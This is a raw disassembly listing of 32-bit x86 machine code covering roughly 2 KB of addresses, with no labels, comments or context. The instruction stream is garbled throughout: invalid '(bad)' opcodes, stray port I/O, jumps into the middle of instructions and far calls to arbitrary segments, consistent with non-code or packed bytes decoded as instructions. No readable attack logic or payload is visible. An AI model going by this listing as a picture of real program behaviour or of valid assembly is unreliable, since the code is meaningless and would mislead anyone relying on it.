  416b8d:	inc    ecx
  416b8e:	inc    esi
  416b8f:	fisubr WORD PTR [edx+0x7b]
  416b92:	test   DWORD PTR [ebp+eax*2+0x75],ebp
  416b96:	mov    ebx,0x4decd38b
  416b9b:	sub    ebp,DWORD PTR [ecx-0xcb98c5f]
  416ba1:	push   cs
  416ba2:	in     eax,0x51
  416ba4:	jno    0x416b90
  416ba6:	or     eax,0xcaf9cba1
  416bab:	or     DWORD PTR ds:0x3b514925,edi
  416bb1:	pop    eax
  416bb2:	mov    ecx,0x7b29b8b5
  416bb7:	rcr    ebp,1
  416bb9:	outs   dx,DWORD PTR ds:[esi]
  416bba:	mov    ds:0xe0213e78,eax
  416bbf:	adc    bl,bl
  416bc1:	push   ecx
  416bc2:	shl    bh,0x9d
  416bc5:	jl     0x416b79
  416bc7:	jno    0x416bb8
  416bc9:	sub    esi,0x57
  416bcc:	ds inc ecx
  416bce:	sub    al,0xab
  416bd0:	loope  0x416be7
  416bd2:	addr16 lock test eax,0x8734e4fb
  416bd9:	lock push ebx
  416bdb:	in     al,dx
  416bdc:	mov    bh,0x75
  416bde:	and    BYTE PTR ds:0x76c6a46d,bh
  416be4:	adc    esp,eax
  416be6:	cmp    cl,ah
  416be8:	(bad)  
  416bea:	in     eax,0x6d
  416bec:	inc    ebp
  416bed:	push   eax
  416bee:	push   ds
  416bef:	retf   0x263c
  416bf2:	and    BYTE PTR ds:0xfc2e6ebb,0x82
  416bf9:	mov    BYTE PTR [edi-0x14],al
  416bfc:	es (bad) 
  416bfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bff:	scas   eax,DWORD PTR es:[edi]
  416c00:	test   eax,0xea25a823
  416c05:	adc    DWORD PTR [eax+0x55db8bb3],ebp
  416c0b:	mov    esp,0x8e5adbf6
  416c10:	mov    ah,0xc9
  416c12:	xor    BYTE PTR [eax],bl
  416c14:	mov    dh,0xd7
  416c16:	xchg   edx,eax
  416c17:	rcl    DWORD PTR [ebx-0x4e],0x73
  416c1b:	dec    esi
  416c1c:	xchg   ebp,eax
  416c1d:	out    dx,al
  416c1e:	rcr    DWORD PTR [edx],cl
  416c20:	jecxz  0x416c2f
  416c22:	sub    cl,BYTE PTR [esp+eax*1-0x12]
  416c26:	inc    eax
  416c27:	xor    DWORD PTR [esi],ebp
  416c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2a:	mov    WORD PTR [eax],gs
  416c2c:	out    0xe2,eax
  416c2e:	inc    esi
  416c2f:	dec    edi
  416c30:	aad    0x51
  416c32:	scas   al,BYTE PTR es:[edi]
  416c33:	and    al,0xf
  416c35:	sbb    dh,BYTE PTR ds:[eax]
  416c38:	inc    ecx
  416c39:	pop    edx
  416c3a:	cmp    BYTE PTR [eax],cl
  416c3c:	jb     0x416c66
  416c3e:	push   edx
  416c3f:	ret    0x1bb9
  416c42:	sub    al,0x47
  416c44:	jns    0x416bdd
  416c46:	sbb    eax,DWORD PTR [ecx]
  416c48:	xchg   DWORD PTR [esi],ebp
  416c4a:	jl     0x416c9e
  416c4c:	(bad)  
  416c4d:	mov    ds:0x566ac5f2,eax
  416c52:	push   ds
  416c53:	out    dx,al
  416c54:	loop   0x416ca0
  416c56:	dec    ecx
  416c57:	sbb    DWORD PTR [edx-0x4089956f],0xffffffcc
  416c5e:	pop    esi
  416c5f:	push   ebx
  416c60:	xchg   ebp,eax
  416c61:	(bad)  
  416c62:	xlat   BYTE PTR ds:[ebx]
  416c63:	pop    ebx
  416c64:	inc    edx
  416c65:	dec    edi
  416c66:	sub    ebp,DWORD PTR [ebp+esi*4-0x8]
  416c6a:	jae    0x416c22
  416c6c:	scas   eax,DWORD PTR es:[edi]
  416c6d:	pusha  
  416c6e:	(bad)
  416c72:	cld    
  416c73:	cmp    eax,0xbced25c7
  416c78:	mov    ?,WORD PTR [edi]
  416c7a:	outs   dx,DWORD PTR ds:[esi]
  416c7b:	push   esi
  416c7c:	jge    0x416c2b
  416c7e:	mov    ds,WORD PTR [esi+eax*8+0x1e]
  416c82:	fdivp  st(0),st
  416c84:	fldenv [ebp-0x7e]
  416c87:	inc    edi
  416c88:	dec    ebp
  416c89:	push   edi
  416c8a:	sahf   
  416c8b:	sub    edi,esp
  416c8d:	push   ebx
  416c8e:	cmp    al,0x33
  416c90:	lock cmp al,0x34
  416c93:	in     al,0x46
  416c95:	rcl    DWORD PTR [eax-0x22],0x7a
  416c99:	push   ebp
  416c9a:	or     al,0x3b
  416c9c:	jmp    0x42518567
  416ca1:	push   esi
  416ca2:	cmp    al,0x51
  416ca4:	adc    eax,0xd8300939
  416ca9:	sahf   
  416caa:	lds    eax,FWORD PTR [edi-0x73dab451]
  416cb0:	pop    edx
  416cb1:	js     0x416cb8
  416cb3:	out    dx,eax
  416cb4:	lods   al,BYTE PTR ds:[esi]
  416cb5:	xchg   edx,eax
  416cb6:	mov    al,0xbf
  416cb8:	sbb    eax,0x770753a6
  416cbd:	sub    edi,0xffffff82
  416cc0:	sub    ah,BYTE PTR [ebx]
  416cc2:	ins    BYTE PTR es:[edi],dx
  416cc3:	sbb    al,0xa0
  416cc5:	adc    al,0x89
  416cc7:	and    BYTE PTR [ecx],0x35
  416cca:	mov    cs,WORD PTR [edi]
  416ccc:	push   ss
  416ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cce:	scas   eax,DWORD PTR es:[edi]
  416ccf:	fwait
  416cd0:	mov    al,ds:0xeb4c3fa5
  416cd5:	packssdw mm1,QWORD PTR [ebx+esi*4-0x7d]
  416cda:	cli    
  416cdb:	(bad)  
  416cdc:	jmp    0x755f:0x656d508f
  416ce3:	in     al,0x63
  416ce5:	out    0x5a,al
  416ce7:	enter  0x6294,0x4b
  416ceb:	ins    DWORD PTR es:[edi],dx
  416cec:	mov    eax,ds:0x4b3c3f65
  416cf1:	lods   eax,DWORD PTR ds:[esi]
  416cf2:	and    ah,BYTE PTR [esi+ecx*8-0x30]
  416cf6:	add    DWORD PTR gs:[edi-0x5d],edx
  416cfa:	mov    DWORD PTR [ecx+0x3aa3259b],0xf64e3107
  416d04:	popa   
  416d05:	out    dx,eax
  416d06:	ds shr ebp,1
  416d09:	inc    esp
  416d0a:	jo     0x416d7d
  416d0c:	repz jp 0x416d5e
  416d0f:	fcomp  DWORD PTR [eax]
  416d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d12:	out    dx,eax
  416d13:	int3   
  416d14:	inc    esp
  416d15:	dec    ebx
  416d16:	sub    ah,dh
  416d18:	fs pusha 
  416d1a:	(bad)  [eax-0x66496660]
  416d20:	call   FWORD PTR [eax-0x34373fa1]
  416d26:	pop    es
  416d27:	ret    0x3010
  416d2a:	imul   ecx,DWORD PTR [eax-0x5f23903c],0xffffffd0
  416d31:	push   0x4d
  416d33:	add    al,0xf0
  416d35:	adc    eax,0xaa22ba4a
  416d3a:	ins    DWORD PTR es:[edi],dx
  416d3b:	loop   0x416ce9
  416d3d:	fs jae 0x416cd0
  416d40:	(bad)  
  416d41:	in     al,dx
  416d42:	adc    BYTE PTR [eax-0x8a1ecaf],cl
  416d48:	fbstp  TBYTE PTR [ecx-0x6c5f5cdc]
  416d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d4f:	xchg   BYTE PTR [edi+0x62],dh
  416d52:	cs cld 
  416d54:	xor    dl,BYTE PTR [eax-0x2]
  416d57:	mov    ds:0x68040dbb,al
  416d5c:	jne    0x416d31
  416d5e:	call   0x32c9:0xb6b224a7
  416d65:	icebp  
  416d66:	pop    eax
  416d67:	fsubp  st(7),st
  416d69:	fistp  DWORD PTR [edi-0x26]
  416d6c:	inc    esi
  416d6d:	xor    al,0xf5
  416d6f:	add    al,0xde
  416d71:	(bad)  
  416d72:	dec    BYTE PTR [eax]
  416d74:	pop    edi
  416d75:	mov    ebx,0x51496deb
  416d7a:	cmp    al,0x7c
  416d7c:	les    esp,FWORD PTR [eax-0x4d]
  416d7f:	jnp    0x416dd8
  416d81:	jnp    0x416d9c
  416d83:	in     al,dx
  416d84:	adc    bh,bh
  416d86:	retf   0x3da3
  416d89:	push   ds
  416d8a:	push   edi
  416d8b:	xor    eax,0x4811700e
  416d90:	mov    bh,0x7c
  416d92:	mul    BYTE PTR [ebx-0x52]
  416d95:	or     BYTE PTR [edi+0x4f],cl
  416d98:	mov    WORD PTR [ebp+0x3afb2ffc],fs
  416d9e:	test   eax,0xc3a6ee51
  416da3:	pusha  
  416da4:	or     eax,0xd79d714d
  416da9:	js     0x416d4f
  416dab:	loop   0x416df0
  416dad:	mov    ds,WORD PTR [eax-0x46]
  416db0:	test   BYTE PTR [ebp+0x1c90e909],ah
  416db6:	(bad)  
  416db8:	out    0x11,eax
  416dba:	dec    ebx
  416dbb:	inc    BYTE PTR [edi]
  416dbd:	sub    DWORD PTR [eax-0x3feb3aa6],ecx
  416dc3:	and    edi,ebp
  416dc5:	inc    ebx
  416dc6:	ret    0x519f
  416dc9:	jmp    0x5ff3a297
  416dce:	push   ebp
  416dcf:	inc    eax
  416dd0:	fsqrt  
  416dd2:	sbb    ecx,ebx
  416dd4:	mov    dh,0xd1
  416dd6:	out    dx,eax
  416dd7:	or     DWORD PTR [ebp-0x1e37f589],0xffffffa5
  416dde:	mov    dl,0xa9
  416de0:	addr16 in eax,0xe3
  416de3:	push   ss
  416de4:	pop    es
  416de5:	inc    edi
  416de6:	imul   eax,DWORD PTR ds:0x3b6cb6a5,0xe459bcce
  416df0:	pop    eax
  416df1:	loope  0x416d8b
  416df3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416df4:	mov    ebp,0xfa494f0a
  416df9:	(bad)  
  416dfa:	shr    BYTE PTR [ebx+0x36336ddd],1
  416e00:	xor    edx,ebp
  416e02:	(bad)  
  416e03:	int3   
  416e04:	cmc    
  416e05:	sbb    ebx,DWORD PTR [ebx-0x7f0e2753]
  416e0b:	sbb    DWORD PTR [edi],0x4b
  416e0e:	cmp    esi,esi
  416e10:	or     DWORD PTR [esi-0x349bda54],0xffffffaa
  416e17:	fisubr WORD PTR [esi-0x7ff23ac9]
  416e1d:	pusha  
  416e1e:	popa   
  416e1f:	sahf   
  416e20:	fwait
  416e21:	push   edi
  416e22:	mov    ds:0xc57427c1,eax
  416e27:	jnp    0x416e81
  416e29:	jmp    0x884872dd
  416e2e:	mov    edi,0x1f599b63
  416e33:	jmp    0x416e34
  416e35:	pop    ss
  416e36:	int    0x2b
  416e38:	int3   
  416e39:	sbb    ah,BYTE PTR [eax+0x4984763d]
  416e3f:	pop    ebp
  416e40:	std    
  416e41:	push   esp
  416e42:	adc    al,0x3f
  416e44:	push   ecx
  416e45:	fmul   DWORD PTR [esi+0x6813fbc3]
  416e4b:	sub    esp,edx
  416e4d:	sub    dl,al
  416e4f:	das    
  416e50:	(bad)  
  416e51:	(bad)  
  416e52:	mov    al,0xe6
  416e54:	push   cs
  416e55:	popa   
  416e56:	add    eax,0x37067f03
  416e5b:	mov    WORD PTR [ebp+edi*4+0x30f58ee3],?
  416e62:	jne    0x416e25
  416e64:	pop    esi
  416e65:	ins    DWORD PTR es:[edi],dx
  416e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e67:	imul   edi,DWORD PTR es:[edx-0x5a],0x9a4cac1e
  416e6f:	jo     0x416ee6
  416e71:	test   al,0x25
  416e73:	xor    DWORD PTR [edi+0x5d],ecx
  416e76:	leave  
  416e77:	pop    eax
  416e78:	and    ebp,ebp
  416e7a:	jbe    0x416eea
  416e7c:	and    BYTE PTR [ecx-0x8],bh
  416e7f:	sti    
  416e80:	cs popf 
  416e82:	cwde   
  416e83:	and    ah,BYTE PTR [eax]
  416e85:	out    dx,eax
  416e86:	adc    BYTE PTR [ebx-0x5719076a],0x33
  416e8d:	inc    ebx
  416e8e:	cld    
  416e8f:	(bad)  
  416e90:	(bad)  
  416e91:	mov    al,ds:0x6e53d8b8
  416e96:	cli    
  416e97:	mov    ebp,0xcee32b9a
  416e9c:	adc    DWORD PTR [ebp-0x2d6df562],eax
  416ea2:	mov    bh,0xba
  416ea4:	and    eax,0xd616e6fb
  416ea9:	cmp    esi,DWORD PTR [edi+edi*2-0x30e2f081]
  416eb0:	xchg   ebx,eax
  416eb1:	pop    eax
  416eb2:	pop    esi
  416eb3:	inc    ecx
  416eb4:	push   ss
  416eb5:	into   
  416eb6:	repz push ebp
  416eb8:	daa    
  416eb9:	ror    DWORD PTR [eax],0xc1
  416ebc:	test   eax,0x9506e83a
  416ec1:	imul   edx,DWORD PTR [edi+0x5fe66376],0xa3adc8d8
  416ecb:	adc    DWORD PTR [eax+0x1f],0x18404fcf
  416ed2:	ror    BYTE PTR [esi-0x7d],cl
  416ed5:	push   0xffffffc3
  416ed7:	xchg   edx,eax
  416ed8:	jge    0x416f22
  416eda:	mov    ebx,0x2c0d8fe4
  416edf:	mov    esi,0xc8e1fb65
  416ee4:	ficomp WORD PTR [ebp+0x4776d708]
  416eea:	pushf  
  416eeb:	jmp    0x1de7ffed
  416ef0:	sbb    esi,DWORD PTR [eax]
  416ef2:	fnstsw WORD PTR [ebp-0x1]
  416ef5:	xchg   ecx,eax
  416ef6:	xor    DWORD PTR [edx-0x2b],edx
  416ef9:	clc    
  416efa:	sub    ebp,ebp
  416efc:	pop    ebx
  416efd:	inc    ebx
  416efe:	jno    0x416ec6
  416f00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f01:	mov    ch,0x3a
  416f03:	jecxz  0x416f1c
  416f05:	sub    BYTE PTR [ecx],bl
  416f07:	xlat   BYTE PTR ds:[ebx]
  416f08:	pop    ebp
  416f09:	push   DWORD PTR [ebx]
  416f0b:	adc    DWORD PTR [ebp+0x670c95d0],esi
  416f11:	jne    0x416ec7
  416f13:	dec    edx
  416f14:	stc    
  416f15:	add    eax,0xb0e7d387
  416f1a:	jo     0x416ed6
  416f1c:	ja     0x416ed4
  416f1e:	iret   
  416f1f:	int3   
  416f20:	mov    BYTE PTR [edi+0x4643b9da],cl
  416f26:	aad    0x1d
  416f28:	xor    ah,bh
  416f2a:	aam    0x58
  416f2c:	inc    eax
  416f2d:	xor    DWORD PTR ds:0x42aadd38,edx
  416f33:	dec    edx
  416f34:	call   0xe31bcda
  416f39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f3a:	or     DWORD PTR [ecx+0xd],ecx
  416f3d:	jmp    0x17a:0x4ce1400b
  416f44:	push   ecx
  416f45:	xchg   ebp,eax
  416f46:	mov    ecx,0x36af1f8e
  416f4b:	addr16 test al,0xf4
  416f4e:	mov    bh,0xb7
  416f50:	pushf  
  416f51:	cmc    
  416f52:	out    0xf3,eax
  416f54:	dec    esp
  416f55:	pop    edx
  416f56:	inc    ebx
  416f57:	das    
  416f58:	stos   DWORD PTR es:[edi],eax
  416f59:	mov    WORD PTR [ecx-0x33dacc98],?
  416f5f:	jns    0x416ef5
  416f61:	ja     0x416fb8
  416f63:	mov    edx,0x70659fcd
  416f68:	pop    esi
  416f69:	mov    bh,0xf
  416f6b:	push   0x9a06b3dd
  416f70:	adc    BYTE PTR [ebp+0x7e],0x86
  416f74:	out    0x19,eax
  416f76:	call   0x593a8574
  416f7b:	inc    edi
  416f7c:	lea    esp,[edi]
  416f7e:	mov    edx,0xa496034a
  416f83:	(bad)  
  416f84:	inc    esp
  416f85:	and    BYTE PTR [ebp-0x47e16bab],al
  416f8b:	ds xchg al,ah
  416f8e:	push   edi
  416f8f:	(bad)  
  416f90:	nop
  416f91:	xor    DWORD PTR [eax],eax
  416f93:	stos   DWORD PTR es:[edi],eax
  416f94:	(bad)  
  416f95:	xor    eax,ecx
  416f97:	push   cs
  416f98:	rcl    ch,cl
  416f9a:	cmp    eax,0x19749b78
  416f9f:	rcr    BYTE PTR [edx-0x66],1
  416fa2:	pop    edi
  416fa3:	jae    0x416fe2
  416fa5:	jmp    0x529f49ae
  416faa:	or     BYTE PTR [ecx+0x19],0x63
  416fae:	jmp    0x7b98340f
  416fb3:	ds jb  0x416f8f
  416fb6:	pusha  
  416fb7:	xor    esp,DWORD PTR [ecx]
  416fb9:	inc    esi
  416fba:	adc    al,0xaf
  416fbc:	ss aas 
  416fbe:	pop    ecx
  416fbf:	ins    BYTE PTR es:[edi],dx
  416fc0:	je     0x416f63
  416fc2:	jbe    0x416fa3
  416fc4:	in     eax,dx
  416fc5:	pushf  
  416fc6:	and    al,0xc9
  416fc8:	call   0x9625762a
  416fcd:	sahf   
  416fce:	xchg   ecx,eax
  416fcf:	cmp    ah,BYTE PTR [ecx-0x2a499fc3]
  416fd5:	retf   
  416fd6:	sbb    bl,BYTE PTR [eax]
  416fd8:	xchg   edi,eax
  416fd9:	jmp    0x3226:0x986b9a14
  416fe0:	pop    ss
  416fe1:	inc    ebx
  416fe2:	mov    edi,0x58d2925c
  416fe7:	shl    DWORD PTR [esi-0x46480784],cl
  416fed:	lods   eax,DWORD PTR ds:[esi]
  416fee:	sub    ah,ch
  416ff0:	repnz ins BYTE PTR es:[edi],dx
  416ff2:	sub    esi,eax
  416ff4:	mov    ebx,0x8b6090c
  416ff9:	jle    0x416fc7
  416ffb:	test   al,0x9d
  416ffd:	pop    ebx
  416ffe:	mov    ebp,0xf52e67ce
  417003:	adc    BYTE PTR [edx-0x491bfb13],ch
  417009:	leave  
  41700a:	cs loope 0x416fc0
  41700d:	bound  sp,DWORD PTR [edi+0x17]
  417011:	sbb    BYTE PTR [eax-0x54],bh
  417014:	push   ebx
  417015:	and    ebp,DWORD PTR [ecx-0x28]
  417018:	(bad)  
  417019:	mov    al,ds:0xd0aa3d08
  41701e:	test   BYTE PTR [edi-0x53],ah
  417021:	or     eax,0x32c5195c
  417026:	and    cl,ch
  417028:	fld1   
  41702a:	imul   DWORD PTR [eax+ebx*1]
  41702d:	pop    ebp
  41702e:	pop    ebp
  41702f:	jo     0x417085
  417031:	(bad)  
  417032:	call   esi
  417034:	ret    
  417035:	mov    esi,0xec1be4bd
  41703a:	(bad)  
  41703b:	fild   WORD PTR [ebp+0x7f]
  41703e:	jb     0x417062
  417040:	mov    ds:0x52cb4b66,al
  417045:	and    eax,0xbdccfeac
  41704a:	mov    cl,0x4a
  41704c:	ins    DWORD PTR es:[edi],dx
  41704d:	imul   esp,DWORD PTR [ecx+0x8e073d9],0xd9852c81
  417057:	(bad)  
  417058:	and    esp,DWORD PTR [esp+edx*8+0x57]
  41705c:	and    ah,BYTE PTR [edx+esi*8+0x7dde8894]
  417063:	fsubr  QWORD PTR [edx+0x6a]
  417066:	mov    bl,0xb9
  417068:	and    DWORD PTR [ecx-0x336b770],edi
  41706e:	nop
  41706f:	shr    DWORD PTR [ecx+eax*8],1
  417072:	pop    edx
  417073:	cmp    ecx,DWORD PTR ds:0x7d42a699
  417079:	push   edi
  41707a:	pusha  
  41707b:	jne    0x41705f
  41707d:	add    ebp,ebx
  41707f:	add    edx,ecx
  417081:	xchg   edx,eax
  417082:	or     edx,esp
  417084:	or     al,0x52
  417086:	pop    edi
  417087:	sbb    al,0x3d
  417089:	or     bh,BYTE PTR [ebp+edi*8-0xc32ee16]
  417090:	cmc    
  417091:	jl     0x4170a4
  417093:	sub    ah,BYTE PTR [ebx]
  417095:	dec    ecx
  417096:	stc    
  417097:	cmp    dh,BYTE PTR [ebx+0x67c78331]
  41709d:	es das 
  41709f:	cmp    ebp,eax
  4170a1:	retf   0xe2a4
  4170a4:	icebp  
  4170a5:	mul    eax
  4170a7:	xchg   ebp,ecx
  4170a9:	jp     0x417057
  4170ab:	xor    ah,BYTE PTR [eax-0x3df42256]
  4170b1:	adc    al,0xe7
  4170b3:	loopne 0x417062
  4170b5:	aam    0x33
  4170b7:	lds    edx,FWORD PTR [ebx]
  4170b9:	mov    dh,0xd4
  4170bb:	jge    0x417128
  4170bd:	sbb    al,0x36
  4170bf:	push   ds
  4170c0:	xlat   BYTE PTR ds:[ebx]
  4170c1:	scas   al,BYTE PTR es:[edi]
  4170c2:	cwde   
  4170c3:	mov    esp,0xcf9e7bd5
  4170c8:	stos   BYTE PTR es:[edi],al
  4170c9:	aas    
  4170ca:	aas    
  4170cb:	loope  0x4170ad
  4170cd:	rcr    DWORD PTR [ebx],0x6c
  4170d0:	or     edx,DWORD PTR cs:[bp-0x3268]
  4170d6:	xor    DWORD PTR [esi-0x1620d17f],0x65
  4170dd:	iret   
  4170de:	dec    edi
  4170df:	and    ah,bl
  4170e1:	mov    ds:0xc4ca0257,eax
  4170e6:	cmp    bl,BYTE PTR [ecx-0x4b]
  4170e9:	pop    esi
  4170ea:	push   0xce794c44
  4170ef:	ins    DWORD PTR es:[edi],dx
  4170f0:	lds    ebp,FWORD PTR [edx-0x7e]
  4170f3:	lods   eax,DWORD PTR ds:[esi]
  4170f4:	lock pop edi
  4170f6:	sbb    bh,cl
  4170f8:	test   al,0x74
  4170fa:	mov    ebp,0xd863908f
  4170ff:	in     al,dx
  417100:	je     0x4170b2
  417102:	loope  0x41711e
  417104:	jmp    0x417150
  417106:	fld    QWORD PTR [esi]
  417108:	fldcw  WORD PTR [ebp-0x59]
  41710b:	loopne 0x41715f
  41710d:	fcmovnb st,st(5)
  41710f:	scas   al,BYTE PTR es:[edi]
  417110:	jge    0x417180
  417112:	push   0x4b
  417114:	les    ebx,FWORD PTR [edi]
  417116:	push   es
  417117:	or     DWORD PTR [ebx+edi*2-0x7c201b70],edx
  41711e:	mov    dh,0x42
  417120:	inc    esi
  417121:	int3   
  417122:	fadd   QWORD PTR fs:[ecx]
  417125:	cmp    esp,DWORD PTR [ebx+edx*1-0x74]
  417129:	pop    ds
  41712a:	daa    
  41712b:	pop    edi
  41712c:	push   eax
  41712d:	rcr    BYTE PTR [ebx],0x79
  417130:	push   0xf3195008
  417135:	adc    eax,DWORD PTR [edx+esi*4-0x76]
  417139:	sbb    dh,BYTE PTR [edi]
  41713b:	arpl   WORD PTR ds:0x63226b21,si
  417141:	mov    ebx,0xe5b1bcbb
  417146:	inc    edx
  417147:	iret   
  417148:	ins    DWORD PTR es:[edi],dx
  417149:	mov    esi,DWORD PTR [esi+0x10]
  41714c:	mov    al,ds:0x24b3398a
  417151:	add    ah,BYTE PTR [ebx]
  417153:	pop    ds
  417154:	or     esi,DWORD PTR [ebx-0x61d9c12c]
  41715a:	dec    esp
  41715b:	mov    bh,0x92
  41715d:	imul   DWORD PTR [ebp+0x7950ccb2]
  417163:	arpl   WORD PTR [edx-0x1d],ax
  417166:	in     eax,0x34
  417168:	pop    es
  417169:	add    al,0x71
  41716b:	jns    0x41712e
  41716d:	mov    ch,0x6c
  41716f:	mov    dh,dh
  417171:	jbe    0x417136
  417173:	cmp    DWORD PTR [eax+0x2afcd46a],ebx
  417179:	aaa    
  41717a:	push   edx
  41717b:	pushf  
  41717c:	mov    bh,0x1d
  41717e:	lock mov ecx,0x1912cad
  417184:	xor    al,0xcf
  417186:	in     al,dx
  417187:	adc    edi,DWORD PTR [edx-0x1a828581]
  41718d:	jge    0x4171eb
  41718f:	imul   ebx,edi,0xffffffb8
  417192:	fcomip st,st(1)
  417194:	jbe    0x417197
  417196:	cld    
  417197:	aaa    
  417198:	inc    edx
  417199:	push   esi
  41719a:	push   ebx
  41719b:	mov    bh,BYTE PTR [ebp+0x4e]
  41719e:	cdq    
  41719f:	and    eax,0xb65ec33
  4171a4:	and    al,0x64
  4171a6:	dec    ecx
  4171a7:	pop    ecx
  4171a8:	and    eax,0xcbd124a9
  4171ad:	pop    ebp
  4171ae:	into   
  4171af:	(bad)  
  4171b0:	xchg   esi,eax
  4171b1:	sbb    ebx,DWORD PTR [edx]
  4171b3:	das    
  4171b4:	lahf   
  4171b5:	jmp    0xfbf09307
  4171ba:	push   eax
  4171bb:	daa    
  4171bc:	adc    eax,0x7f6992ad
  4171c1:	shl    DWORD PTR [edi+0x104c4e51],1
  4171c7:	(bad)  
  4171c8:	push   edi
  4171c9:	push   ebp
  4171ca:	add    al,0x75
  4171cc:	(bad)  
  4171cd:	out    dx,eax
  4171ce:	mov    BYTE PTR [eax],bh
  4171d0:	inc    ebx
  4171d1:	xor    ch,dl
  4171d3:	dec    ebx
  4171d4:	sub    BYTE PTR [edx-0x394777f9],al
  4171da:	out    0x5c,eax
  4171dc:	inc    ebp
  4171dd:	fdivr  QWORD PTR [edi+0x4]
  4171e0:	dec    al
  4171e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171e3:	xchg   esp,eax
  4171e4:	cs ret 0x9e98
  4171e8:	cs mov dh,0x3c
  4171eb:	popa   
  4171ec:	js     0x417209
  4171ee:	lds    edi,FWORD PTR [ebx*4-0x7a2de18b]
  4171f5:	stc    
  4171f6:	cmp    esi,DWORD PTR [ebx]
  4171f8:	mov    ds:0xe56abc5a,al
  4171fd:	or     BYTE PTR [ebx+ecx*1+0x1009ac4e],ah
  417204:	stos   DWORD PTR es:[edi],eax
  417205:	push   eax
  417206:	imul   eax,ebp,0xf91437f3
  41720c:	inc    DWORD PTR [eax-0x6cab5bbb]
  417212:	icebp  
  417213:	call   0x818b0d4e
  417218:	call   0x7c91:0x5aa6351c
  41721f:	add    al,0x34
  417221:	pop    eax
  417222:	je     0x417222
  417224:	aad    0x2f
  417226:	cli    
  417227:	out    0x17,eax
  417229:	or     eax,0xb983d2fd
  41722e:	daa    
  41722f:	mov    edi,0x3dcbc034
  417234:	cmp    al,0x1c
  417236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417237:	adc    al,0xe0
  417239:	test   al,0x31
  41723b:	outs   dx,DWORD PTR ds:[esi]
  41723c:	retf   0xb136
  41723f:	mov    ebp,0x48c552bc
  417244:	out    dx,al
  417245:	outs   dx,BYTE PTR ds:[esi]
  417246:	test   DWORD PTR [ecx+0x4a],esp
  417249:	pop    eax
  41724a:	push   ebx
  41724b:	retf   
  41724c:	and    al,0x76
  41724e:	xchg   ebp,eax
  41724f:	dec    edi
  417250:	jl     0x417260
  417252:	mov    ds:0x796ff84,al
  417257:	aad    0x12
  417259:	fst    DWORD PTR [esi-0x5fad0f17]
  41725f:	mov    esp,0x35ffa3ad
  417264:	pop    ecx
  417265:	fst    DWORD PTR [ebx]
  417267:	std    
  417268:	pop    ecx
  417269:	inc    ebx
  41726a:	in     al,dx
  41726b:	push   eax
  41726c:	shl    BYTE PTR [esi-0x68a74692],cl
  417272:	gs scas eax,DWORD PTR es:[edi]
  417274:	popa   
  417275:	sbb    al,0x6a
  417277:	js     0x417268
  417279:	pushf  
  41727a:	cmp    eax,0xcc182e68
  41727f:	push   esi
  417280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417281:	outs   dx,BYTE PTR ds:[esi]
  417282:	mov    bh,0x8e
  417284:	or     DWORD PTR [ebx],eax
  417286:	mov    bh,0x6
  417288:	ficomp DWORD PTR [eax-0x2d82071a]
  41728e:	ret    
  41728f:	and    eax,0x570dd736
  417294:	enter  0x6853,0x42
  417298:	push   0x6a1406f3
  41729d:	stos   DWORD PTR es:[edi],eax
  41729e:	(bad)  
  41729f:	int    0x3d
  4172a1:	dec    esp
  4172a2:	push   ebp
  4172a3:	sub    al,BYTE PTR [edx-0x1]
  4172a6:	xor    DWORD PTR [ebx+eax*4+0x71a2a848],ebp
  4172ad:	push   ebp
  4172ae:	ds lahf 
  4172b0:	out    0x58,al
  4172b2:	sbb    dl,BYTE PTR [edx]
  4172b4:	or     ebx,DWORD PTR [ebp+0x49f2ea9f]
  4172ba:	or     BYTE PTR [edi+0x20c08e04],bl
  4172c0:	into   
  4172c1:	repz pop ss
  4172c3:	dec    esi
  4172c4:	adc    BYTE PTR [edx+0x7e],cl
  4172c7:	mov    DWORD PTR [edi+0x5d7bb365],0x6f105dd7
  4172d1:	pop    ecx
  4172d2:	push   ds
  4172d3:	adc    DWORD PTR [esp+edi*4],esp
  4172d6:	add    BYTE PTR [esi-0x4b19fa38],ah
  4172dc:	xchg   edi,eax
  4172dd:	data16 sub dl,BYTE PTR [ebx+0x3280aa04]
  4172e4:	sub    BYTE PTR [ebx],bl
  4172e6:	mov    ah,0x69
  4172e8:	jne    0x417318
  4172ea:	in     al,dx
  4172eb:	mov    bh,0x3c
  4172ed:	sar    DWORD PTR [eax],1
  4172ef:	lahf   
  4172f0:	push   edx
  4172f1:	jp     0x417339
  4172f3:	outs   dx,BYTE PTR ds:[esi]
  4172f4:	add    al,0x1c
  4172f6:	imul   edx,DWORD PTR [edi-0xc],0xab7556b5
  4172fd:	xchg   ebx,eax
  4172fe:	sub    edi,DWORD PTR [edx-0x3cae3cfe]
  417304:	push   edx
  417305:	and    BYTE PTR [esi-0x67185369],bh
  41730b:	or     al,0x18
  41730d:	xlat   BYTE PTR ds:[ebx]
  41730e:	or     al,0xb6
  417310:	xor    eax,0x8304b88d
  417315:	call   0xe0cac45a
  41731a:	mov    al,ds:0x63deaebc
  41731f:	mov    ah,0x88
  417321:	dec    esi
  417322:	pusha  
  417323:	int    0x32
  417325:	repz enter 0x79e3,0xde
  41732a:	data16 cmp ah,bl
  41732d:	and    al,BYTE PTR [edx+0x75]
  417330:	fsubr  DWORD PTR [ecx+0x79c2831f]
  417336:	xchg   esi,eax
  417337:	sub    al,0xb7
  417339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41733a:	retf   0x6bdf
  41733d:	test   BYTE PTR [edi],0x3c
  417340:	mov    bl,0x83
  417342:	add    DWORD PTR [edi],edi
  417344:	repnz sbb esp,edx
  417347:	xchg   edi,eax
  417348:	adc    al,0x48
  41734a:	xor    DWORD PTR [edi+0x46e7b4dc],esi
  417350:	push   ecx
  417351:	mov    cl,0xc8
  417353:	jg     0x41736d
  417355:	sub    dl,cl
